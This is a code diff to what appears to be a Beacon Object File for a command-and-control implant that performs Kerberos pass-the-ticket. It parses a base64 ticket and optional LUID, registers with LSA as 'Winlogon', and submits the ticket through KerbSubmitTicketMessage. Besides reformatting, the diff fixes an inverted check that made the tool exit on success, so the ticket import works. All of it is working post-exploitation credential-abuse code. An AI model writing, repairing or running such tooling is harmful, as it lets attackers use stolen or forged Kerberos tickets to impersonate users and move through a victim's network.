@@ -78,9 +78,7 @@ BOOL IsSystem(HANDLE TokenHandle) {
     PSID pSystemSid = NULL;
     BOOL bSystem = FALSE;
 
-    // Try to open the token of the current thread first
     if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle)) {
-        // If there is no thread token, fall back to the process token
         if (KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
             if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &TokenHandle)) {
                 return FALSE;
@@ -105,19 +103,19 @@ BOOL IsSystem(HANDLE TokenHandle) {
     return bSystem;
 }
 
+// FIX: Return TRUE on success, FALSE on failure, instead of leaking raw NTSTATUS as BOOL
 BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
-    HANDLE hLsaLocal = NULL;
-    ULONG  mode = 0;
-    bool   status = true;
+    NTSTATUS status;
+    ULONG    mode = 0;
+
     if (highIntegrity) {
-        STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
-        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
+        STRING lsaString = { .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
+        status = SECUR32$LsaRegisterLogonProcess(&lsaString, hLsa, &mode);
+    } else {
+        status = SECUR32$LsaConnectUntrusted(hLsa);
     }
-    else {
-        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
-    }
-    *hLsa = hLsaLocal;
-    return status;
+
+    return NT_SUCCESS(status); // TRUE on success, FALSE on failure
 }
 
 int my_isdigit(int c) {
@@ -143,8 +141,7 @@ long int my_strtol(const char* str, char** endptr, int base) {
         int digit = 0;
         if (my_isdigit(*str)) {
             digit = *str - '0';
-        }
-        else if (base == 16) {
+        } else if (base == 16) {
             digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
         }
 
@@ -177,11 +174,10 @@ void PTT(char* luid, byte* ticket) {
     if (luid) {
         targetLuid.LowPart = my_strtol(luid, NULL, 16);
         if (targetLuid.LowPart == 0 || targetLuid.LowPart == LONG_MAX || targetLuid.LowPart == LONG_MIN) {
-            PRINT_OUT("[x] Invalid luid\n");
+            PRINT_OUT("[X] Invalid luid\n");
             return;
         }
-    }
-    else {
+    } else {
         targetLuid = currentLuid;
     }
 
@@ -194,10 +190,15 @@ void PTT(char* luid, byte* ticket) {
         IsHighIntegrity = false;
 
     HANDLE hLsa;
-    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;
+    // FIX: was `if (GetLsaHandle(...)) return;` which exited on SUCCESS.
+    // Now correctly exits on FAILURE.
+    if (!GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) {
+        PRINT_OUT("[X] Failed to get LSA handle.\n");
+        return;
+    }
 
     ULONG authPackage;
-    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
+    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
     if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {
 
         int decode_ticket_size = 0;
@@ -206,8 +207,8 @@ void PTT(char* luid, byte* ticket) {
         int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decode_ticket_size;
         KERB_SUBMIT_TKT_REQUEST* submitRequest = MemAlloc(submitSize);
 
-        submitRequest->MessageType = KerbSubmitTicketMessage;
-        submitRequest->KerbCredSize = decode_ticket_size;
+        submitRequest->MessageType    = KerbSubmitTicketMessage;
+        submitRequest->KerbCredSize   = decode_ticket_size;
         submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
         if (IsHighIntegrity)
             submitRequest->LogonId = targetLuid;
@@ -217,8 +218,8 @@ void PTT(char* luid, byte* ticket) {
         MemCpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, decode_ticket, decode_ticket_size);
 
         NTSTATUS protocolStatus = 0;
-        ULONG    responseSize = 0;
-        void* response = 0;
+        ULONG    responseSize   = 0;
+        void*    response       = 0;
         if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus) || protocolStatus)
             PRINT_OUT("\n[X] Ticket not imported.\n");
         else
@@ -227,15 +228,15 @@ void PTT(char* luid, byte* ticket) {
     SECUR32$LsaDeregisterLogonProcess(hLsa);
 }
 
-void PTT_RUN( PCHAR Buffer, IN DWORD Length ) {
+void PTT_RUN(PCHAR Buffer, IN DWORD Length) {
     PRINT_OUT("\n[*] Action: Import Ticket\n\n");
 
     char* ticket = NULL;
-    char* luid = NULL;
+    char* luid   = NULL;
 
     for (int i = 0; i < Length; i++) {
-        i += GetStrParam(Buffer + i, Length - i, "/luid:", 6, &luid );
-        i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket );
+        i += GetStrParam(Buffer + i, Length - i, "/luid:",   6, &luid);
+        i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket);
     }
 
     if (ticket)
@@ -244,7 +245,7 @@ void PTT_RUN( PCHAR Buffer, IN DWORD Length ) {
         PRINT_OUT("[X] /ticket:BASE64 must be supplied!\n");
 }
 
-VOID go( IN PCHAR Buffer, IN ULONG Length ) {
+VOID go(IN PCHAR Buffer, IN ULONG Length) {
     INIT_BOF();
 
     datap parser;
@@ -252,10 +253,10 @@ VOID go( IN PCHAR Buffer, IN ULONG Length ) {
     DWORD PARAM_SIZE = 0;
     PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);
 
-    if( LoadFunc() )
+    if (LoadFunc())
         PRINT_OUT("%s\n", "Modules not loaded");
     else
-        PTT_RUN( PARAM, PARAM_SIZE );
+        PTT_RUN(PARAM, PARAM_SIZE);
 
     FreeBank();
 
